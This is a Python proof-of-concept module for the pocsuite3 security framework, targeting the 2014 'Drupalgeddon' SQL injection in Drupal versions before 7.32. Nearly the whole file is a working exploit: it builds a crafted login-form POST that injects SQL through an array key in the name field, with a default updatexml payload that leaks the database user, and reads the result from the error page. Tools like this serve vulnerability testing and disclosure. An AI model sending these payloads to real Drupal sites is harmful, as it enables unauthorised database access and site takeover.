"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import re
# import base64
from collections import OrderedDict

from pocsuite3.api import Output
from pocsuite3.api import POCBase
from pocsuite3.api import OptDict
# from pocsuite3.api import logger
from pocsuite3.api import requests
from pocsuite3.api import OptString
from pocsuite3.api import register_poc
from pocsuite3.api import POC_CATEGORY
# from pocsuite3.api import REVERSE_PAYLOAD
# from pocsuite3.api import get_listener_ip
# from pocsuite3.api import get_listener_port


class DemoPOC(POCBase):
	vulID = '87364'  # ssvid
	version = '1.0'
	author = ['Knownsec']
	vulDate = '2014-10-15'
	createDate = '2014-11-13'
	updateDate = '2014-11-13'
	references = ['https://www.seebug.org/vuldb/ssvid-87364']
	name = 'Drupal < 7.32 “Drupalgeddon” SQL注入漏洞'
	appPowerLink = 'https://www.drupal.org/'
	appName = 'Drupal'
	appVersion = '< 7.32'
	vulType = 'SQL-injection'
	desc = '''
		其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行
		任意SQL语句，插入、修改管理员信息，甚至执行任意代码。
	'''
	samples = ['http://10.10.50.19:8118']
	install_requires = []
	category = POC_CATEGORY.EXPLOITS.WEBAPP

	def _options(self):
		o = OrderedDict()
		o["sql"] = OptString('0 or updatexml(0,concat(0xa,user()),0)%23', description='需要用户输入sql注入', require=True)
		
		return o

	def _verify(self):
		result = {}
		url = self.url.rstrip('/') + '/?q=node&destination=node'
		headers = get_headers()
		payload = 'pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[%s]=bob&name[0]=a' % self.get_option("sql")
		q = requests.post(url, headers=headers, data=payload)
		# print(q.text)
		line = r'PDOException([\s\S]*)user\.module'
		m = re.search(line, q.text, re.M|re.I)
		# print('-----------------')
		# print(m.group())
		# if p.status_code == 301:
		if m:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['payload'] = payload
			result['VerifyInfo']['content'] = m.group()

		return self.parse_output(result)

	def _attack(self):
		return self._verify()

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output

def get_headers():
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',
		'Accept': '*/*',
		'Accept-Language': 'en',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/x-www-form-urlencoded'
	}
	
	return headers

register_poc(DemoPOC)